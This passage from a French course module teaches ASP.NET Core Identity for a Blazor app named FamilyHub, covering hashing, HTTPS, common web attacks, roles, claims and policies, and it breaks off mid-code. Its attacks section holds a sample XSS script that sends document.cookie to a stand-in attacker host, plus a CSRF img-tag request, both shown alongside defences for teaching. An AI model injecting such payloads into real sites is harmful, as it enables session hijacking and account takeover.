# Module 06 - Authentification & Identity

## Objectifs du module

A la fin de ce module, vous serez capable de :

1. **Comprendre** la difference entre authentification et autorisation
2. **Configurer** ASP.NET Core Identity dans un projet Blazor
3. **Implementer** l'authentification par JWT (JSON Web Tokens)
4. **Comprendre** OAuth 2.0 et OpenID Connect
5. **Integrer** Duende IdentityServer pour des scenarios avances
6. **Securiser** FamilyHub avec un systeme d'authentification complet
7. **Appliquer** les bonnes pratiques de securite (OWASP)

## Prerequis

- Modules 01 a 03 completes (Clean Architecture, CQRS, Pragmatic Architecture)
- Connaissance de C# et ASP.NET Core
- FamilyHub fonctionnel avec l'architecture en couches

---

# PARTIE 1 - Fondamentaux de l'Authentification

## 1.1 Authentication vs Authorization

C'est LA question fondamentale que tout developpeur doit maitriser. Ces deux concepts sont souvent confondus, mais ils sont tres differents.

### L'analogie du batiment d'entreprise

Imaginez que vous arrivez dans un grand batiment d'entreprise :

**Authentification = "Qui etes-vous ?"**
- Vous presentez votre **badge d'entree** au vigile
- Le vigile verifie votre identite (photo, nom, numero d'employe)
- Si le badge est valide, vous entrez dans le batiment
- C'est le processus de **prouver votre identite**

**Autorisation = "Qu'avez-vous le droit de faire ?"**
- Une fois dans le batiment, votre badge determine les portes que vous pouvez ouvrir
- Un employe standard accede aux bureaux du 1er etage
- Un manager accede aussi au 3eme etage
- Seul le directeur accede a la salle des serveurs
- C'est le processus de **verifier vos permissions**

```
┌─────────────────────────────────────────────────────────┐
│                   AUTHENTIFICATION                       │
│                                                         │
│   Utilisateur  ──►  "Qui suis-je ?"  ──►  Identite     │
│                                            verifiee     │
│   (login/mdp)      (badge d'entree)       (oui/non)    │
└─────────────────────────────────────────────────────────┘
                          │
                          ▼
┌─────────────────────────────────────────────────────────┐
│                    AUTORISATION                          │
│                                                         │
│   Identite     ──►  "Ai-je le droit ?"  ──►  Acces     │
│   verifiee          (droits d'acces)         (oui/non)  │
│                                                         │
│   (employe)         (role: admin?)          (403/200)   │
└─────────────────────────────────────────────────────────┘
```

### En code ASP.NET Core

```csharp
// AUTHENTIFICATION : verifier l'identite
[ApiController]
public class AuthController : ControllerBase
{
    [HttpPost("login")]
    public async Task<IActionResult> Login(LoginRequest request)
    {
        // Verifier que l'utilisateur est bien celui qu'il pretend etre
        var user = await _userManager.FindByEmailAsync(request.Email);
        var result = await _signInManager.CheckPasswordSignInAsync(user, request.Password, false);

        if (result.Succeeded)
            return Ok(GenerateToken(user)); // Identite confirmee

        return Unauthorized(); // Identite rejetee (401)
    }
}

// AUTORISATION : verifier les permissions
[Authorize(Roles = "Admin")] // Seuls les admins peuvent acceder
public class AdminController : ControllerBase
{
    [HttpGet("users")]
    public async Task<IActionResult> GetAllUsers()
    {
        // Si l'utilisateur n'a pas le role Admin -> 403 Forbidden
        return Ok(await _userService.GetAllUsers());
    }
}
```

### Codes HTTP associes

| Code | Signification | Contexte |
|------|--------------|----------|
| **401 Unauthorized** | Authentification echouee | "Je ne sais pas qui vous etes" |
| **403 Forbidden** | Autorisation refusee | "Je sais qui vous etes, mais vous n'avez pas le droit" |

> **Attention** : Le nom du code 401 est trompeur ! "Unauthorized" signifie en realite "Unauthenticated" (non authentifie). C'est une erreur historique dans la specification HTTP.

---

## 1.2 Histoire de l'authentification web

L'authentification web a evolue considerablement au fil des annees. Comprendre cette evolution aide a comprendre pourquoi nous utilisons les technologies actuelles.

### Etape 1 : Basic Authentication (annees 1990)

Le navigateur envoie le nom d'utilisateur et le mot de passe encodes en Base64 dans chaque requete.

```
GET /api/tasks HTTP/1.1
Authorization: Basic dXNlcjpwYXNzd29yZA==
```

**Problemes :**
- Base64 n'est PAS du chiffrement (c'est juste un encodage, facilement decodable)
- Le mot de passe transite a chaque requete
- Pas de moyen de "deconnecter" l'utilisateur
- Aucune gestion de session

### Etape 2 : Session Cookies (annees 2000)

Le serveur cree une session apres la connexion et envoie un cookie au navigateur.

```
1. POST /login (user + password)
2. Serveur cree une session en memoire (Session ID = abc123)
3. Reponse : Set-Cookie: SessionId=abc123
4. Requetes suivantes : Cookie: SessionId=abc123
5. Serveur verifie la session en memoire
```

**Avantages :** Le mot de passe ne transite qu'une seule fois.
**Problemes :**
- Le serveur doit stocker toutes les sessions en memoire (probleme de scalabilite)
- Difficile avec plusieurs serveurs (sticky sessions necessaires)
- Vulnerable aux attaques CSRF

### Etape 3 : Tokens (annees 2010)

Le serveur genere un token signe (JWT) que le client stocke et envoie a chaque requete.

```
1. POST /login (user + password)
2. Serveur genere un JWT signe
3. Client stocke le token (localStorage, cookie)
4. Requetes suivantes : Authorization: Bearer eyJhbG...
5. Serveur verifie la signature du token (pas besoin de session en memoire)
```

**Avantages :**
- Stateless : pas de session serveur, scalabilite facile
- Le token contient les informations de l'utilisateur (claims)
- Fonctionne parfaitement avec les API REST et les microservices

### Etape 4 : OAuth 2.0 / OpenID Connect (annees 2010-maintenant)

Delegation de l'authentification a un fournisseur d'identite externe (Google, Microsoft, etc.) ou interne (Duende IdentityServer).

```
┌──────────┐     ┌──────────────┐     ┌─────────────────┐
│  Client  │────►│  Identity    │────►│  Resource Server │
│  (Blazor)│◄────│  Provider    │     │  (API FamilyHub) │
│          │     │  (Google,    │     │                  │
│          │     │   Duende)    │     │                  │
└──────────┘     └──────────────┘     └─────────────────┘
```

**Avantages :**
- L'application ne gere jamais les mots de passe des utilisateurs
- Single Sign-On (SSO) entre plusieurs applications
- Separation des responsabilites

---

## 1.3 Hashing & Salting des mots de passe

### Pourquoi ne JAMAIS stocker un mot de passe en clair ?

Imaginons cette table en base de donnees :

```
| UserId | Email              | Password      |
|--------|--------------------|---------------|
| 1      | alice@mail.com     | MonChat123    |
| 2      | bob@mail.com       | P@ssw0rd!     |
| 3      | charlie@mail.com   | MonChat123    |
```

**Scenario catastrophe :** Un pirate accede a votre base de donnees (via SQL injection, backup vole, employe malveillant...). Il obtient TOUS les mots de passe en clair. Comme 65% des utilisateurs reutilisent leurs mots de passe, le pirate peut maintenant acceder a leurs comptes email, bancaires, etc.

### Le hashing : une fonction a sens unique

Un hash est une empreinte numerique irreversible. On ne peut pas retrouver le mot de passe original a partir du hash.

```
"MonChat123"  ──► SHA256 ──► "a8f5f167f44f4964e6c998dee827110c..."
"MonChat124"  ──► SHA256 ──► "7b3d979ca8330a94fa7e9e1b466d8b99..."  (completement different!)
```

```
| UserId | Email              | PasswordHash                              |
|--------|--------------------|-------------------------------------------|
| 1      | alice@mail.com     | a8f5f167f44f4964e6c998dee827110c...       |
| 2      | bob@mail.com       | 5e884898da28047151d0e56f8dc62927...       |
| 3      | charlie@mail.com   | a8f5f167f44f4964e6c998dee827110c...       |
```

**Probleme :** Alice et Charlie ont le meme hash car ils ont le meme mot de passe ! Un pirate avec une **rainbow table** (table precalculee de hashes) peut retrouver les mots de passe courants.

### Le salting : rendre chaque hash unique

Un **salt** est une valeur aleatoire unique ajoutee au mot de passe avant le hashing.

```
"MonChat123" + "x7Kp2m" (salt Alice)   ──► SHA256 ──► "9f2a3b..."
"MonChat123" + "Qw8nRt" (salt Charlie) ──► SHA256 ──► "4d7e1c..."  (different!)
```

```
| UserId | Email              | Salt     | PasswordHash    |
|--------|--------------------|----------|-----------------|
| 1      | alice@mail.com     | x7Kp2m   | 9f2a3b...       |
| 2      | bob@mail.com       | Lm4vBz   | 7c8d2e...       |
| 3      | charlie@mail.com   | Qw8nRt   | 4d7e1c...       |
```

Meme mot de passe, mais hashes differents ! Les rainbow tables deviennent inutiles.

### Algorithmes recommandes

| Algorithme | Utilisation | Commentaire |
|-----------|-------------|-------------|
| **bcrypt** | Recommande | Lent par conception, resistant aux attaques GPU |
| **Argon2** | Le plus recent | Gagnant de la competition Password Hashing (2015) |
| **PBKDF2** | ASP.NET Identity | Utilise par defaut dans .NET Identity |
| SHA256 | NE PAS utiliser seul | Trop rapide, vulnerable aux attaques brute force |
| MD5 | JAMAIS | Casse depuis des annees, collisions connues |

> **Important** : ASP.NET Core Identity gere automatiquement le hashing et le salting avec PBKDF2. Vous n'avez jamais besoin de le faire manuellement !

```csharp
// ASP.NET Core Identity fait tout ca automatiquement :
var result = await _userManager.CreateAsync(user, "MonMotDePasse");
// Le mot de passe est automatiquement hashe avec PBKDF2 + salt unique

// Pour verifier un mot de passe :
var isValid = await _userManager.CheckPasswordAsync(user, "MonMotDePasse");
// Identity compare le hash du mot de passe fourni avec le hash stocke
```

---

## 1.4 HTTPS : pourquoi c'est obligatoire

### Le probleme de HTTP (sans S)

HTTP transmet les donnees **en clair**. Toute personne sur le meme reseau (WiFi public, par exemple) peut intercepter le trafic.

```
┌──────────┐    HTTP (texte clair)    ┌──────────┐
│  Client  │ ──────────────────────►  │  Serveur │
│          │  Authorization: Basic    │          │
│          │  dXNlcjpwYXNzd29yZA==   │          │
└──────────┘                          └──────────┘
        │
        │  ┌──────────┐
        └──│  Pirate  │  "Je vois tout !"
           │  (sniff)  │
           └──────────┘
```

### HTTPS = HTTP + TLS (Transport Layer Security)

HTTPS chiffre toute la communication entre le client et le serveur.

```
┌──────────┐    HTTPS (chiffre)       ┌──────────┐
│  Client  │ ──────────────────────►  │  Serveur │
│          │  &%$#@!*^&$#@!*^&       │          │
│          │  (donnees chiffrees)     │          │
└──────────┘                          └──────────┘
        │
        │  ┌──────────┐
        └──│  Pirate  │  "Je ne comprends rien..."
           │  (sniff)  │
           └──────────┘
```

### En ASP.NET Core

```csharp
// Program.cs - Forcer HTTPS
var app = builder.Build();
app.UseHttpsRedirection(); // Redirige HTTP vers HTTPS automatiquement

// Dans appsettings.json en production
// Configurer un certificat TLS valide (Let's Encrypt est gratuit)
```

> **Regle absolue** : Toute application qui gere de l'authentification DOIT utiliser HTTPS. Sans HTTPS, les mots de passe, tokens et cookies transitent en clair sur le reseau.

---

## 1.5 Les attaques courantes

### Brute Force

Le pirate essaie toutes les combinaisons possibles de mots de passe.

```
Tentative 1 : "aaaaaa" -> Echec
Tentative 2 : "aaaaab" -> Echec
...
Tentative N : "P@ssw0rd!" -> Succes !
```

**Protection :**
- Mots de passe complexes (longueur minimale, caracteres speciaux)
- Verrouillage de compte apres X tentatives
- Rate limiting sur l'endpoint de login
- CAPTCHA apres plusieurs echecs

```csharp
// Configuration du verrouillage dans ASP.NET Core Identity
services.Configure<IdentityOptions>(options =>
{
    options.Lockout.DefaultLockoutTimeSpan = TimeSpan.FromMinutes(15);
    options.Lockout.MaxFailedAccessAttempts = 5;
    options.Lockout.AllowedForNewUsers = true;
});
```

### Credential Stuffing

Le pirate utilise des listes de couples email/mot de passe voles sur d'autres sites.

```
Site A pirate : alice@mail.com / MonChat123
Le pirate essaie sur votre site : alice@mail.com / MonChat123
Si Alice reutilise son mot de passe -> Compromis !
```

**Protection :**
- Encourager les mots de passe uniques
- Verifier les mots de passe contre les bases de donnees de fuites (Have I Been Pwned)
- Authentification multi-facteurs (2FA)

### Session Hijacking

Le pirate vole le cookie de session ou le token d'un utilisateur connecte.

**Protection :**
- Cookies HttpOnly (inaccessibles depuis JavaScript)
- Cookies Secure (envoyes uniquement en HTTPS)
- Cookies SameSite (protection contre les requetes cross-origin)
- Duree de vie courte des tokens
- Rotation des tokens de refresh

```csharp
// Configuration securisee des cookies
services.ConfigureApplicationCookie(options =>
{
    options.Cookie.HttpOnly = true;       // Inaccessible depuis JS
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always; // HTTPS uniquement
    options.Cookie.SameSite = SameSiteMode.Strict;           // Meme site uniquement
    options.ExpireTimeSpan = TimeSpan.FromHours(1);          // Expiration courte
    options.SlidingExpiration = true;
});
```

### CSRF (Cross-Site Request Forgery)

Le pirate cree une page web malveillante qui envoie des requetes au nom de l'utilisateur connecte.

```
1. Alice est connectee a FamilyHub (cookie de session actif)
2. Alice visite un site malveillant
3. Le site malveillant contient : <img src="https://familyhub.com/api/tasks/delete/1">
4. Le navigateur envoie la requete avec le cookie d'Alice !
5. La tache est supprimee sans qu'Alice le sache
```

**Protection :**
- Tokens anti-CSRF (generes par le serveur, valides a chaque requete POST/PUT/DELETE)
- Cookie SameSite=Strict
- Verifier le header Origin/Referer

```csharp
// ASP.NET Core genere automatiquement des tokens anti-CSRF pour les formulaires
// Dans Blazor Server, c'est gere automatiquement par SignalR
@using Microsoft.AspNetCore.Antiforgery
<AntiforgeryToken />
```

### XSS (Cross-Site Scripting)

Le pirate injecte du code JavaScript malveillant dans une page web.

```html
<!-- Imaginons un champ de commentaire non securise -->
<input type="text" value="<script>
    // Ce script vole le cookie de session et l'envoie au pirate
    fetch('https://pirate.com/steal?cookie=' + document.cookie);
</script>">
```

**Protection :**
- Encoder toutes les sorties HTML (Blazor le fait automatiquement)
- Content Security Policy (CSP) headers
- Cookies HttpOnly (le JavaScript ne peut pas lire les cookies)
- Ne jamais utiliser `@Html.Raw()` avec des donnees utilisateur

```csharp
// Blazor encode automatiquement les sorties :
<p>@userInput</p>  <!-- Securise : les balises HTML sont echappees -->

// DANGEREUX : ne jamais faire ca avec des donnees utilisateur !
<p>@((MarkupString)userInput)</p>  <!-- Le HTML est interprete tel quel -->
```

---

# PARTIE 2 - ASP.NET Core Identity

## 2.1 Qu'est-ce que .NET Identity ?

ASP.NET Core Identity est le framework d'authentification **built-in** de .NET. Il fournit tout ce dont vous avez besoin pour gerer les utilisateurs, les mots de passe, les roles et les claims.

C'est comme un "kit complet" pour l'authentification : au lieu de tout coder vous-meme (ce qui est dangereux !), vous utilisez une solution testee et maintenue par Microsoft.

### Ce que .NET Identity fournit :

- Gestion des utilisateurs (creation, modification, suppression)
- Hashing securise des mots de passe (PBKDF2 avec salt)
- Gestion des roles (Admin, User, etc.)
- Gestion des claims (informations sur l'utilisateur)
- Confirmation par email
- Authentification a deux facteurs (2FA)
- Verrouillage de compte
- Login externe (Google, Microsoft, GitHub)
- Tokens de reinitialisation de mot de passe

---

## 2.2 Les classes principales

### IdentityUser

La classe de base qui represente un utilisateur. Elle contient les proprietes essentielles :

```csharp
// Classe IdentityUser simplifiee (les proprietes les plus importantes)
public class IdentityUser
{
    public string Id { get; set; }                    // GUID unique
    public string UserName { get; set; }              // Nom d'utilisateur
    public string NormalizedUserName { get; set; }    // Version normalisee (pour recherche)
    public string Email { get; set; }                 // Adresse email
    public string NormalizedEmail { get; set; }       // Version normalisee
    public bool EmailConfirmed { get; set; }          // Email verifie ?
    public string PasswordHash { get; set; }          // Hash du mot de passe
    public string SecurityStamp { get; set; }         // Change quand le profil change
    public string PhoneNumber { get; set; }           // Numero de telephone
    public bool TwoFactorEnabled { get; set; }        // 2FA active ?
    public DateTimeOffset? LockoutEnd { get; set; }   // Fin du verrouillage
    public int AccessFailedCount { get; set; }        // Nombre de tentatives echouees
}
```

Vous pouvez etendre cette classe pour ajouter vos propres proprietes :

```csharp
// Dans FamilyHub, on etend IdentityUser pour notre domaine
public class FamilyHubUser : IdentityUser
{
    public string FirstName { get; set; } = string.Empty;
    public string LastName { get; set; } = string.Empty;
    public string? FamilyId { get; set; }
    public string FullName => $"{FirstName} {LastName}";

    // Navigation vers les taches assignees
    public ICollection<TaskItem> AssignedTasks { get; set; } = new List<TaskItem>();
}
```

### IdentityRole

Represente un role dans le systeme :

```csharp
public class IdentityRole
{
    public string Id { get; set; }
    public string Name { get; set; }            // "Admin", "FamilyMember"
    public string NormalizedName { get; set; }   // "ADMIN", "FAMILYMEMBER"
}
```

### UserManager<TUser>

Le service principal pour gerer les utilisateurs. C'est votre "telecommande" pour tout ce qui touche aux utilisateurs.

```csharp
public class UserManager<TUser>
{
    // Creer un utilisateur
    Task<IdentityResult> CreateAsync(TUser user, string password);

    // Trouver un utilisateur
    Task<TUser?> FindByIdAsync(string userId);
    Task<TUser?> FindByEmailAsync(string email);
    Task<TUser?> FindByNameAsync(string userName);

    // Mots de passe
    Task<bool> CheckPasswordAsync(TUser user, string password);
    Task<IdentityResult> ChangePasswordAsync(TUser user, string currentPassword, string newPassword);
    Task<string> GeneratePasswordResetTokenAsync(TUser user);
    Task<IdentityResult> ResetPasswordAsync(TUser user, string token, string newPassword);

    // Roles
    Task<IdentityResult> AddToRoleAsync(TUser user, string role);
    Task<IdentityResult> RemoveFromRoleAsync(TUser user, string role);
    Task<IList<string>> GetRolesAsync(TUser user);
    Task<bool> IsInRoleAsync(TUser user, string role);

    // Claims
    Task<IList<Claim>> GetClaimsAsync(TUser user);
    Task<IdentityResult> AddClaimAsync(TUser user, Claim claim);

    // Email
    Task<string> GenerateEmailConfirmationTokenAsync(TUser user);
    Task<IdentityResult> ConfirmEmailAsync(TUser user, string token);

    // 2FA
    Task<bool> GetTwoFactorEnabledAsync(TUser user);
    Task<IdentityResult> SetTwoFactorEnabledAsync(TUser user, bool enabled);
}
```

### SignInManager<TUser>

Gere le processus de connexion/deconnexion :

```csharp
public class SignInManager<TUser>
{
    // Connexion avec mot de passe
    Task<SignInResult> PasswordSignInAsync(string userName, string password,
        bool isPersistent, bool lockoutOnFailure);

    // Connexion avec un fournisseur externe (Google, etc.)
    Task<SignInResult> ExternalLoginSignInAsync(string loginProvider,
        string providerKey, bool isPersistent);

    // Deconnexion
    Task SignOutAsync();

    // 2FA
    Task<SignInResult> TwoFactorSignInAsync(string provider, string code,
        bool isPersistent, bool rememberClient);

    // Verifier si l'utilisateur est connecte
    bool IsSignedIn(ClaimsPrincipal principal);
}
```

---

## 2.3 Mise en place d'Identity pas a pas

### Etape 1 : Ajouter les packages NuGet

```bash
# Package principal Identity
dotnet add package Microsoft.AspNetCore.Identity.EntityFrameworkCore

# Pour Blazor
dotnet add package Microsoft.AspNetCore.Identity.UI
```

### Etape 2 : Creer l'utilisateur personnalise

```csharp
// src/Domain/Users/FamilyHubUser.cs
using Microsoft.AspNetCore.Identity;

namespace FamilyHub.Domain.Users;

public class FamilyHubUser : IdentityUser
{
    public string FirstName { get; set; } = string.Empty;
    public string LastName { get; set; } = string.Empty;
    public string? FamilyId { get; set; }

    public string FullName => $"{FirstName} {LastName}";
}
```

### Etape 3 : Configurer le DbContext

```csharp
// src/Infrastructure/Database/ApplicationDbContext.cs
using Microsoft.AspNetCore.Identity.EntityFrameworkCore;
using Microsoft.EntityFrameworkCore;

namespace FamilyHub.Infrastructure.Database;

// AVANT : DbContext
// APRES : IdentityDbContext<FamilyHubUser> (herite de DbContext)
public class ApplicationDbContext : IdentityDbContext<FamilyHubUser>
{
    public ApplicationDbContext(DbContextOptions<ApplicationDbContext> options)
        : base(options) { }

    public DbSet<TaskItem> Tasks { get; set; }

    protected override void OnModelCreating(ModelBuilder modelBuilder)
    {
        // IMPORTANT : appeler base.OnModelCreating pour configurer les tables Identity
        base.OnModelCreating(modelBuilder);

        modelBuilder.ApplyConfigurationsFromAssembly(Assembly.GetExecutingAssembly());
    }
}
```

### Etape 4 : Enregistrer Identity dans le DI container

```csharp
// src/Api/Program.cs ou ServiceCollectionExtensions.cs
services.AddIdentity<FamilyHubUser, IdentityRole>(options =>
{
    // Configuration des mots de passe
    options.Password.RequireDigit = true;
    options.Password.RequireLowercase = true;
    options.Password.RequireUppercase = true;
    options.Password.RequireNonAlphanumeric = true;
    options.Password.RequiredLength = 8;
    options.Password.RequiredUniqueChars = 4;

    // Configuration du verrouillage
    options.Lockout.DefaultLockoutTimeSpan = TimeSpan.FromMinutes(15);
    options.Lockout.MaxFailedAccessAttempts = 5;
    options.Lockout.AllowedForNewUsers = true;

    // Configuration de l'utilisateur
    options.User.RequireUniqueEmail = true;
    options.User.AllowedUserNameCharacters =
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-._@+";

    // Configuration de la confirmation email
    options.SignIn.RequireConfirmedEmail = false; // true en production !
})
.AddEntityFrameworkStores<ApplicationDbContext>()
.AddDefaultTokenProviders();
```

### Etape 5 : Ajouter le middleware d'authentification

```csharp
// Program.cs - L'ORDRE EST IMPORTANT !
var app = builder.Build();

app.UseHttpsRedirection();
app.UseAuthentication();    // 1. D'abord l'authentification (qui suis-je ?)
app.UseAuthorization();     // 2. Ensuite l'autorisation (ai-je le droit ?)

app.MapControllers();
app.Run();
```

> **Attention a l'ordre** : `UseAuthentication()` doit toujours etre appele AVANT `UseAuthorization()`. Sinon, le systeme essaiera de verifier les permissions sans savoir qui est l'utilisateur !

### Etape 6 : Creer la migration

```bash
dotnet ef migrations add AddIdentity
dotnet ef database update
```

---

## 2.4 Schema de la base de donnees Identity

Quand vous ajoutez Identity, Entity Framework cree automatiquement ces tables :

```
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
│  AspNetUsers     │     │ AspNetUserRoles   │     │  AspNetRoles    │
│─────────────────│     │──────────────────│     │─────────────────│
│ Id (PK)         │◄───┤│ UserId (FK)      │├───►│ Id (PK)         │
│ UserName        │     │ RoleId (FK)       │     │ Name            │
│ Email           │     └──────────────────┘     │ NormalizedName  │
│ PasswordHash    │                               └─────────────────┘
│ SecurityStamp   │     ┌──────────────────┐
│ FirstName *     │◄───┤│ AspNetUserClaims  │
│ LastName *      │     │──────────────────│
│ FamilyId *      │     │ Id (PK)          │
└─────────────────┘     │ UserId (FK)      │
        │               │ ClaimType        │
        │               │ ClaimValue       │
        │               └──────────────────┘
        │
        │               ┌──────────────────┐
        └──────────────►│ AspNetUserLogins  │
        │               │──────────────────│
        │               │ LoginProvider    │
        │               │ ProviderKey      │
        │               │ UserId (FK)      │
        │               └──────────────────┘
        │
        │               ┌──────────────────┐
        └──────────────►│ AspNetUserTokens  │
                        │──────────────────│
                        │ UserId (FK)      │
                        │ LoginProvider    │
                        │ Name             │
                        │ Value            │
                        └──────────────────┘

* = Proprietes personnalisees ajoutees dans FamilyHubUser
```

| Table | Role |
|-------|------|
| **AspNetUsers** | Stocke les utilisateurs (email, hash du mot de passe, etc.) |
| **AspNetRoles** | Stocke les roles (Admin, FamilyMember, etc.) |
| **AspNetUserRoles** | Table de liaison many-to-many entre utilisateurs et roles |
| **AspNetUserClaims** | Claims associes a un utilisateur (informations supplementaires) |
| **AspNetRoleClaims** | Claims associes a un role |
| **AspNetUserLogins** | Logins externes (Google, Microsoft, etc.) |
| **AspNetUserTokens** | Tokens de l'utilisateur (reset password, 2FA, etc.) |

---

## 2.5 Politiques de mot de passe

```csharp
services.Configure<IdentityOptions>(options =>
{
    // Politique stricte (recommandee pour la production)
    options.Password.RequiredLength = 12;          // Minimum 12 caracteres
    options.Password.RequireDigit = true;           // Au moins un chiffre
    options.Password.RequireLowercase = true;       // Au moins une minuscule
    options.Password.RequireUppercase = true;       // Au moins une majuscule
    options.Password.RequireNonAlphanumeric = true; // Au moins un caractere special
    options.Password.RequiredUniqueChars = 6;       // Au moins 6 caracteres differents
});
```

> **Tendance actuelle (NIST 2024)** : Les recommandations modernes favorisent les **mots de passe longs** (passphrases) plutot que les regles de complexite. "MonChatMangeDesCroquettes" est plus securise et plus facile a retenir que "P@s5w0rd!".

---

## 2.6 Flux de confirmation par email

```
1. L'utilisateur s'inscrit
2. Identity genere un token de confirmation unique
3. L'application envoie un email avec un lien contenant le token
4. L'utilisateur clique sur le lien
5. Identity valide le token et confirme l'email
```

```csharp
// Inscription avec confirmation email
public async Task<IActionResult> Register(RegisterRequest request)
{
    var user = new FamilyHubUser
    {
        UserName = request.Email,
        Email = request.Email,
        FirstName = request.FirstName,
        LastName = request.LastName
    };

    var result = await _userManager.CreateAsync(user, request.Password);

    if (result.Succeeded)
    {
        // Generer le token de confirmation
        var token = await _userManager.GenerateEmailConfirmationTokenAsync(user);

        // Encoder le token pour l'URL
        var encodedToken = WebEncoders.Base64UrlEncode(Encoding.UTF8.GetBytes(token));

        // Construire le lien de confirmation
        var confirmationLink = $"https://familyhub.com/confirm-email?userId={user.Id}&token={encodedToken}";

        // Envoyer l'email (en utilisant IEmailSender du projet)
        await _emailSender.SendEmailAsync(user.Email, "Confirmez votre email",
            $"Cliquez ici pour confirmer : <a href='{confirmationLink}'>Confirmer</a>");

        return Ok("Verifiez votre email pour confirmer votre compte.");
    }

    return BadRequest(result.Errors);
}

// Endpoint de confirmation
public async Task<IActionResult> ConfirmEmail(string userId, string token)
{
    var user = await _userManager.FindByIdAsync(userId);
    if (user == null) return NotFound();

    var decodedToken = Encoding.UTF8.GetString(WebEncoders.Base64UrlDecode(token));
    var result = await _userManager.ConfirmEmailAsync(user, decodedToken);

    return result.Succeeded
        ? Ok("Email confirme !")
        : BadRequest("Token invalide ou expire.");
}
```

---

## 2.7 Authentification a deux facteurs (2FA)

La 2FA ajoute une couche de securite supplementaire en demandant un deuxieme facteur en plus du mot de passe :

- **Quelque chose que vous savez** : mot de passe
- **Quelque chose que vous avez** : telephone (code SMS, application authenticator)
- **Quelque chose que vous etes** : empreinte digitale, reconnaissance faciale

```csharp
// Activer la 2FA pour un utilisateur
public async Task<IActionResult> Enable2FA()
{
    var user = await _userManager.GetUserAsync(User);

    // Generer la cle secrete pour l'application authenticator
    var unformattedKey = await _userManager.GetAuthenticatorKeyAsync(user);
    if (string.IsNullOrEmpty(unformattedKey))
    {
        await _userManager.ResetAuthenticatorKeyAsync(user);
        unformattedKey = await _userManager.GetAuthenticatorKeyAsync(user);
    }

    // Generer le QR code pour Google Authenticator / Microsoft Authenticator
    var email = await _userManager.GetEmailAsync(user);
    var authenticatorUri = $"otpauth://totp/FamilyHub:{email}?secret={unformattedKey}&issuer=FamilyHub&digits=6";

    return Ok(new { SharedKey = unformattedKey, AuthenticatorUri = authenticatorUri });
}

// Verifier le code 2FA lors de la connexion
public async Task<IActionResult> Verify2FA(string code)
{
    var result = await _signInManager.TwoFactorAuthenticatorSignInAsync(
        code, isPersistent: false, rememberClient: false);

    if (result.Succeeded)
        return Ok("Connexion reussie !");

    return Unauthorized("Code 2FA invalide.");
}
```

---

## 2.8 Autorisation basee sur les Claims

Les **claims** sont des paires cle-valeur qui decrivent un utilisateur. C'est comme les informations sur votre carte d'identite.

```csharp
// Exemples de claims
new Claim(ClaimTypes.Name, "Alice Dupont")          // Nom
new Claim(ClaimTypes.Email, "alice@familyhub.com")   // Email
new Claim(ClaimTypes.Role, "Admin")                  // Role
new Claim("FamilyId", "family-123")                  // Claim personnalise
new Claim("SubscriptionLevel", "Premium")            // Claim personnalise
```

### Utilisation dans l'autorisation

```csharp
// Autoriser uniquement les utilisateurs Premium
[Authorize(Policy = "PremiumOnly")]
public async Task<IActionResult> GetPremiumFeatures()
{
    return Ok("Fonctionnalites premium !");
}

// Configuration de la politique
services.AddAuthorization(options =>
{
    options.AddPolicy("PremiumOnly", policy =>
        policy.RequireClaim("SubscriptionLevel", "Premium"));
});
```

---

## 2.9 Autorisation basee sur les Roles

Les roles sont le moyen le plus simple de gerer les permissions :

```csharp
// Creer des roles au demarrage de l'application
public static async Task SeedRoles(IServiceProvider serviceProvider)
{
    var roleManager = serviceProvider.GetRequiredService<RoleManager<IdentityRole>>();

    string[] roles = { "Admin", "FamilyMember", "Guest" };

    foreach (var role in roles)
    {
        if (!await roleManager.RoleExistsAsync(role))
        {
            await roleManager.CreateAsync(new IdentityRole(role));
        }
    }
}

// Assigner un role a un utilisateur
await _userManager.AddToRoleAsync(user, "FamilyMember");

// Proteger un endpoint par role
[Authorize(Roles = "Admin")]
public async Task<IActionResult> DeleteFamily(string familyId) { ... }

// Autoriser plusieurs roles
[Authorize(Roles = "Admin,FamilyMember")]
public async Task<IActionResult> ViewTasks() { ... }
```

---

## 2.10 Autorisation basee sur les Policies

Les policies offrent plus de flexibilite que les simples roles :

```csharp
// Configuration des policies dans Program.cs
services.AddAuthorization(options =>
{
    // Policy simple : role requis
    options.AddPolicy("AdminOnly", policy =>
        policy.RequireRole("Admin"));

    // Policy avec claim
    options.AddPolicy("FamilyMember", policy =>
        policy.RequireClaim("FamilyId"));

    // Policy combinee : role ET claim
    options.AddPolicy("FamilyAdmin", policy =>
        policy.RequireRole("Admin")
              .RequireClaim("FamilyId"));

    // Policy personnalisee avec un handler
    options.AddPolicy("CanManageTasks", policy =>
        policy.Requirements.Add(new CanManageTasksRequirement()));

    // Policy avec age minimum
    options.AddPolicy("AdultOnly", policy =>
        policy.Requirements.Add(new MinimumAgeRequirement(18)));
});

// Handler personnalise pour la policy "CanManageTasks"
public class CanManageTasksRequirement : IAuthorizationRequirement { }

public class CanManageTasksHandler : AuthorizationHandler<CanManageTasksRequirement>
{
    protected override Task HandleRequirementAsync(
        AuthorizationHandlerContext context,
        CanManageTasksRequirement requirement)
    {
        // Verifier si l'utilisateur est Admin OU proprietaire de la tache
        if (context.User.IsInRole("Admin"))
        {
            context.Succeed(requirement);
        }
        else if (context.Resource is TaskItem task)
        {
            var userId = context.User.FindFirstValue(ClaimTypes.NameIdentifier);
            if (task.AssignedToId == userId)
            {
                context.Succeed(requirement);
            }
        }

        return Task.CompletedTask;
    }
}

// Enregistrer le handler
services.AddScoped<IAuthorizationHandler, CanManageTasksHandler>();
```

### Utiliser une Policy dans Blazor

```razor
@* Dans un composant Blazor *@
<AuthorizeView Policy="AdminOnly">
    <Authorized>
        <button @onclick="DeleteFamily">Supprimer la famille</button>
    </Authorized>
    <NotAuthorized>
        <p>Vous n'avez pas les droits d'administration.</p>
    </NotAuthorized>
</AuthorizeView>
```

---

## 2.11 Ajout d'Identity a un projet Blazor

```csharp
// Program.cs - Configuration complete pour Blazor
var builder = WebApplication.CreateBuilder(args);

// 1. Configurer Identity
builder.Services.AddIdentity<FamilyHubUser, IdentityRole>(options =>
{
    options.Password.RequiredLength = 8;
    options.SignIn.RequireConfirmedEmail = false;
})
.AddEntityFrameworkStores<ApplicationDbContext>()
.AddDefaultTokenProviders();

// 2. Configurer le cookie d'authentification pour Blazor
builder.Services.ConfigureApplicationCookie(options =>
{
    options.LoginPath = "/login";
    options.LogoutPath = "/logout";
